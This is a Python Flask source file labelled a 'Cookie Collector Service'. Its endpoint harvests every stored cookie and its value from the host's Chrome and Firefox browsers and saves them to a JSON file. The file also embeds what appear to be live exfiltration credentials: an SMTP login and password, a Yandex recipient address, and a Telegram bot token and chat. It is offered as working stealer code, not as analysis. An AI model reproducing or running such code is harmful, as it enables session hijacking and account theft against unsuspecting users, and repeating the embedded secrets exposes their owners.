import json
import os
from flask import Flask, jsonify
import browser_cookie3
import requests

app = Flask(__name__)

COOKIES_DIR = 'cookies'  # Directory to save cookies files
os.makedirs(COOKIES_DIR, exist_ok=True)

SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.hostinger.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', 465))
EMAIL_ADDRESS = os.environ.get('EMAIL_ADDRESS', 'mail@lbrealty.online')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', 'Johnson8666@')
RECIPIENT_EMAIL = os.environ.get('RECIPIENT_EMAIL', 'w.sp4ce@yandex.com')

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '5444520238:AAHo9DY-sSdKi6wh36WEpTTLA2S5V6Pc5A8')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '@blavkcap')

@app.route('/')
def index():
    return "Welcome to the Cookie Collector Service. Use /collect-cookies to collect cookies."

@app.route('/collect-cookies')
def collect_cookies():
    all_cookies = {}
    browsers = ['chrome', 'firefox']

    for browser in browsers:
        try:
            print(f"Attempting to load cookies from {browser}")
            if browser == 'chrome':
                cookies = browser_cookie3.chrome()
            elif browser == 'firefox':
                cookies = browser_cookie3.firefox()

            cookie_list = []
            for cookie in cookies:
                cookie_dict = {
                    'domain': cookie.domain or '',
                    'name': cookie.name,
                    'value': cookie.value,
                    'path': cookie.path or '',
                    'secure': cookie.secure,
                    'expires': cookie.expires or ''
                }
                cookie_list.append(cookie_dict)

            all_cookies[browser] = cookie_list
            print(f"Successfully loaded cookies from {browser}")
        except Exception as e:
            print(f"{browser.capitalize()} error: {e}")

    output_file = os.path.join(COOKIES_DIR, 'cookies.json')
    with open(output_file, 'w') as f:
        json.dump(all_cookies, f, indent=4)

    return "Cookies collected and saved."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5004)
